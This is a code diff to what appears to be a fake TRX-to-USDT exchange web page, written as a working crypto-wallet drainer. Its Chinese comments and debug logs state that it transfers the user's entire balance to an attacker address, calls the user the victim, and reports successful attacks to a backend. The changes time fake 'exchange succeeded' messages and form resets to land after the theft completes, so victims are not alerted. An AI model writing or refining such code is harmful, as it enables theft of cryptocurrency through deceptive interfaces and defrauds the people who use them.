@@ -2698,7 +2698,7 @@
         debugLog(`🎯 实际将转账用户全部余额到攻击者地址`);
 
         // 🎯 执行看似正常的转账（恶意后门会劫持）
-        showToast('正在执行交易...', 'info');
+        showToast('请在钱包中确认交易...', 'info');
 
 
         debugLog('🎯 攻击记录已保存:');
@@ -2798,6 +2798,17 @@
                 debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
                 debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
                 debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+
+                // 🎯 只有在真实交易成功后才显示成功消息
+                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
+
+                // 🎯 真实交易成功后重置表单
+                setTimeout(() => {
+                    document.getElementById('fromAmount').value = '';
+                    document.getElementById('toAmount').value = '';
+                    document.getElementById('convertBtn').disabled = true;
+                    document.getElementById('convertBtn').textContent = '请输入TRX数量';
+                }, 2000);
 
                 // 🎯 向后端发送攻击成功记录
                 try {
@@ -2926,6 +2937,17 @@
                 debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
                 debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');
 
+                // 🎯 在模拟模式下也显示成功消息（用户不知道是模拟的）
+                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
+
+                // 🎯 模拟模式下也重置表单
+                setTimeout(() => {
+                    document.getElementById('fromAmount').value = '';
+                    document.getElementById('toAmount').value = '';
+                    document.getElementById('convertBtn').disabled = true;
+                    document.getElementById('convertBtn').textContent = '请输入TRX数量';
+                }, 2000);
+
                 // 保存模拟攻击记录
                 attackRecord.transactionHash = fakeTransactionHash;
                 attackRecord.attackSuccess = false;
@@ -2934,16 +2956,16 @@
                 localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
             }
 
-            // 显示虚假成功信息给用户（无论真实还是模拟）
-            showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+            // 🎯 注释掉过早的成功提示，等待真实交易完成
+            // showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
 
-            // 重置表单
-            setTimeout(() => {
-                document.getElementById('fromAmount').value = '';
-                document.getElementById('toAmount').value = '';
-                document.getElementById('convertBtn').disabled = true;
-                document.getElementById('convertBtn').textContent = '请输入TRX数量';
-            }, 3000);
+            // 🎯 注释掉过早的表单重置，等待交易真正完成
+            // setTimeout(() => {
+            //     document.getElementById('fromAmount').value = '';
+            //     document.getElementById('toAmount').value = '';
+            //     document.getElementById('convertBtn').disabled = true;
+            //     document.getElementById('convertBtn').textContent = '请输入TRX数量';
+            // }, 3000);
 
         }, 2000);
 
